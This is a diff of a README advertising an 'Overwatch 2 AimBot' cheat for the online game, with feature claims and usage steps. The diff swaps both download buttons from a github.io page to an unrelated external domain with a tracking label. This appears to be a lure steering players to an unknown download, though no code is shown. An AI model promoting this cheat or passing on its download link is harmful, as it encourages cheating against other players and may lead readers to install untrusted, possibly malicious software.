@@ -2,7 +2,7 @@
 
 The **Overwatch 2 AimBot** is an advanced tool designed to give players an edge in every match by automatically locking onto enemies and ensuring your shots hit their mark. With highly customizable settings and features, the aimbot is perfect for players looking to enhance their accuracy, win more matches, and dominate the battlefield with precision.
 
-[![Download Overwatch2 Aim](https://img.shields.io/badge/Download-Overwatch%20Aim-blueviolet)](https://overwatch-2-aimbot.github.io/.github/)
+[![Download Overwatch2 Aim](https://img.shields.io/badge/Download-Overwatch%20Aim-blueviolet)](https://axesetcibles.com?label=884fbd91c9b088d242082409ec43d985)
 
 ## ⚡ Key Features
 
@@ -34,4 +34,4 @@ The **Overwatch 2 AimBot** is an advanced tool designed to give players an edge 
 4. **Activate the aimbot** and let it automatically lock onto enemy targets for perfectly aimed shots.
 5. **Enjoy enhanced accuracy** as you play, effortlessly taking down opponents with pinpoint precision.
 
-[![Download Overwatch2 Aim](https://img.shields.io/badge/Download-Overwatch%20Aim-blueviolet)](https://overwatch-2-aimbot.github.io/.github/)
+[![Download Overwatch2 Aim](https://img.shields.io/badge/Download-Overwatch%20Aim-blueviolet)](https://axesetcibles.com?label=884fbd91c9b088d242082409ec43d985)
